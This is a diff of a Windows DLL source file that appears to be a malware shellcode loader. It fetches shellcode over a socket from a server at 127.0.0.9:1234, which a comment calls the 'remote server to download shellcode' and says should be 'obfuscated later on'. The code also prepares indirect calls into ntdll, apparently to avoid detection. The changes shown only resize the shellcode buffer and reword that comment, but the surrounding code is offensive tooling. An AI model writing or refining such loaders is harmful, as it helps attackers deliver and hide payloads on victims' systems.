@@ -7,6 +7,8 @@
 #include <windows.h>
 #include "mainDLL.h"
 
+#define BUFFER_SIZE 1024
+
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
     switch (fdwReason) {
@@ -58,8 +60,8 @@ BOOL IndirectPrelude(HMODULE NtdllHandle, LPCSTR NtFunctionName, PDWORD NtFuncti
 BOOL main() {
     NTSTATUS Status = 0;
     BOOL State = TRUE;
-    unsigned char shellcode[107550];
-    SIZE_T shellcodeSize = sizeof(shellcode);
+    unsigned char shellcode[BUFFER_SIZE];
+    SIZE_T shellcodeSize = BUFFER_SIZE;
     HMODULE NtdllHandle = NULL;
     PVOID Buffer = NULL;
     HANDLE thread = NULL;
@@ -158,7 +160,7 @@ BOOL downloadPayload(unsigned char* shellcode, size_t limit) {
     struct sockaddr_in clientAddress;
     clientAddress.sin_family = AF_INET;
     clientAddress.sin_port = htons(1234); 
-    clientAddress.sin_addr.s_addr = inet_addr("127.0.0.9"); //obfuscate
+    clientAddress.sin_addr.s_addr = inet_addr("127.0.0.9");  // remote server to download shellcode, should be obfuscated later on
 
     result = connect(clientSocket, (struct sockaddr*)&clientAddress, sizeof(clientAddress));
     if (result == SOCKET_ERROR) {
